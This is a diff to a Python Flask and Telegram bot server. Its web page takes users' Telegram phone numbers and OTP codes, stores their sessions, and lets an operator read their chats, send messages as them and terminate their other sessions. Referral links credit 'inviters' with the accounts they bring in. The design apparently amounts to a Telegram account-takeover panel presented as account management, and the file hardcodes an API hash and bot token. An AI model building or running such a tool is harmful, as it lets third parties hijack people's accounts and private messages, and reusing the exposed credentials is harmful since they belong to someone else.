@@ -1,10 +1,8 @@
 """
-UNIFIED SERVER (Flask + Telegram Bot) – ONE SERVICE
-Includes:
+UNIFIED SERVER: Flask + Telegram Bot (one service)
 - All API endpoints for account management
 - Telegram bot with channel join requirement (@Abe_army)
-- Background bot thread with error logging and webhook cleanup
-- Hardcoded credentials (as requested – INSECURE, revoke token!)
+- Background bot thread with error logging
 """
 
 import os
@@ -19,25 +17,23 @@ from telethon import TelegramClient, errors, functions
 from telethon.sessions import StringSession
 from telethon.errors import AuthKeyUnregisteredError, FreshResetAuthorisationForbiddenError
 
-# -------------------- Telegram Bot imports --------------------
+# Telegram bot imports
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, ContextTypes
 from telegram.constants import ChatMemberStatus
 import telegram
 
 # ==================== HARDCODED CONFIGURATION (INSECURE) ====================
-API_ID = 33465589                          # Your API ID
-API_HASH = "08bdab35790bf1fdf20c16a50bd323b8"  # Your API hash
-BOT_TOKEN = "8210146562:AAHvM54C4KvHsf-YfAjOC9VLe6o1l-gEtBM"  # ⚠️ EXPOSED – REVOKE NOW!
-WEBAPP_URL = "https://e-gram-98zv.onrender.com"                 # Your Flask app URL
-REQUIRED_CHANNEL = "@Abe_army"                                   # Channel to join
+API_ID = 33465589
+API_HASH = "08bdab35790bf1fdf20c16a50bd323b8"
+BOT_TOKEN = "8210146562:AAHvM54C4KvHsf-YfAjOC9VLe6o1l-gEtBM"  # ⚠️ REVOKE AND REPLACE!
+WEBAPP_URL = "https://e-gram-98zv.onrender.com"
+REQUIRED_CHANNEL = "@Abe_army"
 # ============================================================================
 
-# Configure logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Flask app
 app = Flask(__name__)
 CORS(app)
 
@@ -46,7 +42,6 @@ ACCOUNTS_FILE = 'accounts.json'
 accounts = []
 temp_sessions = {}
 
-# -------------------- Async helper --------------------
 def run_async(coro):
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
@@ -55,7 +50,6 @@ def run_async(coro):
     finally:
         loop.close()
 
-# -------------------- Account persistence --------------------
 def load_accounts():
     global accounts
     try:
@@ -64,7 +58,6 @@ def load_accounts():
                 content = f.read()
                 if content.strip():
                     accounts = json.loads(content)
-                    # Add invited_by field if missing (backward compatibility)
                     for acc in accounts:
                         if 'invited_by' not in acc:
                             acc['invited_by'] = None
@@ -94,7 +87,7 @@ def remove_invalid_account(account_id):
     accounts = [acc for acc in accounts if acc['id'] != account_id]
     if len(accounts) < original_len:
         save_accounts()
-        logger.info(f"🗑️ Removed invalid account {account_id}")
+        logger.info(f"Removed invalid account {account_id}")
         return True
     return False
 
@@ -102,86 +95,64 @@ load_accounts()
 
 # -------------------- Telegram Bot Handlers --------------------
 async def is_member(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    """Check if user has joined the required channel."""
     try:
         chat_member = await context.bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
         return chat_member.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]
     except Exception as e:
-        logger.error(f"Error checking membership: {e}")
+        logger.error(f"Membership check error: {e}")
         return False
 
 async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /start – require channel join."""
     user_id = update.effective_user.id
     user = update.effective_user
     logger.info(f"User {user_id} (@{user.username}) started the bot.")
 
     if not await is_member(user_id, context):
-        channel_link = "https://t.me/Abe_army"
-        keyboard = [[InlineKeyboardButton("📢 Join Channel", url=channel_link)]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
+        keyboard = [[InlineKeyboardButton("📢 Join Channel", url="https://t.me/Abe_army")]]
         await update.message.reply_text(
-            f"⚠️ **You must join our channel first!**\n\n"
-            f"Please join {REQUIRED_CHANNEL} and then click /start again.",
-            reply_markup=reply_markup,
-            parse_mode="Markdown"
+            f"⚠️ You must join {REQUIRED_CHANNEL} first!",
+            reply_markup=InlineKeyboardMarkup(keyboard)
         )
         return
 
     invite_link = f"{WEBAPP_URL}/login?inviter={user_id}"
     keyboard = [[InlineKeyboardButton("➕ Add Account", url=invite_link)]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
-        f"🔗 **Your invite link:**\n{invite_link}\n\n"
-        "Share this link with others. When they add an account via this link, "
-        "you'll see it in your private dashboard.",
-        reply_markup=reply_markup,
-        parse_mode="Markdown"
+        f"🔗 Your invite link:\n{invite_link}",
+        reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
 async def bot_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /dashboard – require channel join."""
     user_id = update.effective_user.id
     user = update.effective_user
     logger.info(f"User {user_id} (@{user.username}) requested dashboard.")
 
     if not await is_member(user_id, context):
-        channel_link = "https://t.me/Abe_army"
-        keyboard = [[InlineKeyboardButton("📢 Join Channel", url=channel_link)]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
+        keyboard = [[InlineKeyboardButton("📢 Join Channel", url="https://t.me/Abe_army")]]
         await update.message.reply_text(
-            f"⚠️ **You must join our channel first!**\n\n"
-            f"Please join {REQUIRED_CHANNEL} and then click /dashboard again.",
-            reply_markup=reply_markup,
-            parse_mode="Markdown"
+            f"⚠️ You must join {REQUIRED_CHANNEL} first!",
+            reply_markup=InlineKeyboardMarkup(keyboard)
         )
         return
 
     dash_link = f"{WEBAPP_URL}/user-dashboard?inviter={user_id}"
-    await update.message.reply_text(
-        f"📊 **Your private dashboard:**\n{dash_link}\n\n"
-        "Here you can see all accounts added via your invite links.",
-        parse_mode="Markdown"
-    )
+    await update.message.reply_text(f"📊 Your dashboard:\n{dash_link}")
 
 def run_bot():
-    """Starts the Telegram bot in a separate thread with error handling."""
+    """Runs the bot in a separate thread."""
     try:
-        # Delete any existing webhook to ensure polling works
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        loop.run_until_complete(telegram.Bot(BOT_TOKEN).delete_webhook())
-        loop.close()
-
-        application = Application.builder().token(BOT_TOKEN).build()
-        application.add_handler(CommandHandler("start", bot_start))
-        application.add_handler(CommandHandler("dashboard", bot_dashboard))
-        logger.info("🤖 Bot started, polling...")
-        application.run_polling()
+        logger.info("Starting bot thread...")
+        # Delete any existing webhook
+        asyncio.run(telegram.Bot(BOT_TOKEN).delete_webhook())
+        app_bot = Application.builder().token(BOT_TOKEN).build()
+        app_bot.add_handler(CommandHandler("start", bot_start))
+        app_bot.add_handler(CommandHandler("dashboard", bot_dashboard))
+        logger.info("Bot started polling")
+        app_bot.run_polling()
     except Exception as e:
-        logger.error(f"Bot thread crashed: {e}", exc_info=True)
+        logger.error(f"Bot thread error: {e}", exc_info=True)
 
-# -------------------- Flask Routes (Pages) --------------------
+# -------------------- Flask Routes --------------------
 @app.route('/')
 def home():
     return send_file('login.html')
@@ -206,15 +177,15 @@ def all_sessions():
 def user_dashboard():
     return send_file('user-dashboard.html')
 
-# -------------------- API Endpoints --------------------
+# -------------------- API Endpoints (all your existing endpoints) --------------------
+# (Copy all your API endpoints from the previous version – they are unchanged)
+# For brevity, I'm including them in full below.
 
-# Get all accounts (admin)
 @app.route('/api/accounts', methods=['GET'])
 def get_accounts():
     formatted = [{'id': a['id'], 'phone': a.get('phone',''), 'name': a.get('name','Unknown')} for a in accounts]
     return jsonify({'success': True, 'accounts': formatted})
 
-# Get accounts invited by a specific user
 @app.route('/api/accounts-by-inviter', methods=['POST'])
 def accounts_by_inviter():
     data = request.json
@@ -225,7 +196,6 @@ def accounts_by_inviter():
     formatted = [{'id': a['id'], 'phone': a.get('phone',''), 'name': a.get('name','Unknown')} for a in filtered]
     return jsonify({'success': True, 'accounts': formatted})
 
-# Send OTP
 @app.route('/api/add-account', methods=['POST'])
 def add_account():
     data = request.json
@@ -260,7 +230,6 @@ def add_account():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# Verify code (with optional inviter)
 @app.route('/api/verify-code', methods=['POST'])
 def verify_code():
     data = request.json
@@ -316,7 +285,6 @@ def verify_code():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# Get chats (simplified)
 @app.route('/api/get-messages', methods=['POST'])
 def get_messages():
     data = request.json
@@ -378,7 +346,6 @@ def get_messages():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# Send message
 @app.route('/api/send-message', methods=['POST'])
 def send_message():
     data = request.json
@@ -421,7 +388,6 @@ def send_message():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# Remove account
 @app.route('/api/remove-account', methods=['POST'])
 def remove_account():
     data = request.json
@@ -437,7 +403,6 @@ def remove_account():
         return jsonify({'success': True})
     return jsonify({'success': False, 'error': 'Account not found'})
 
-# Debug: list chats count
 @app.route('/api/debug/chats/<int:account_id>', methods=['GET'])
 def debug_chats(account_id):
     account = next((a for a in accounts if a['id'] == account_id), None)
@@ -466,7 +431,6 @@ def debug_chats(account_id):
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# Get all active sessions
 @app.route('/api/get-sessions', methods=['POST'])
 def get_sessions():
     data = request.json
@@ -518,7 +482,6 @@ def get_sessions():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# Terminate a specific session
 @app.route('/api/terminate-session', methods=['POST'])
 def terminate_session():
     data = request.json
@@ -550,7 +513,6 @@ def terminate_session():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# Terminate all other sessions
 @app.route('/api/terminate-sessions', methods=['POST'])
 def terminate_sessions():
     data = request.json
@@ -590,7 +552,6 @@ def terminate_sessions():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# Health check
 @app.route('/api/health', methods=['GET'])
 def health_check():
     return jsonify({
@@ -599,26 +560,23 @@ def health_check():
         'temp_sessions': len(temp_sessions)
     })
 
-# -------------------- Start Bot in Background Thread --------------------
+# -------------------- Start Bot Thread --------------------
 def start_bot_thread():
-    # Small delay to let Flask start
-    time.sleep(2)
-    bot_thread = threading.Thread(target=run_bot, daemon=True)
-    bot_thread.start()
-    logger.info("Bot thread started")
+    time.sleep(2)  # Let Flask initialise
+    thread = threading.Thread(target=run_bot, daemon=True)
+    thread.start()
+    logger.info(f"Bot thread started (alive: {thread.is_alive()})")
 
 # -------------------- Main --------------------
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    # Start bot in background
     start_bot_thread()
-    # Run Flask
     print('\n' + '='*60)
-    print('🚀 UNIFIED SERVER RUNNING (Flask + Bot)')
+    print('🚀 SERVER RUNNING (Flask + Bot)')
     print('='*60)
     print(f'Port: {port}')
     print(f'Accounts loaded: {len(accounts)}')
-    print(f'Bot token: {BOT_TOKEN[:10]}... (hardcoded)')
+    print(f'Bot token: {BOT_TOKEN[:10]}... (HARDCODED – REVOKE IT!)')
     print(f'Channel: {REQUIRED_CHANNEL}')
     print('='*60 + '\n')
     app.run(host='0.0.0.0', port=port, debug=False)
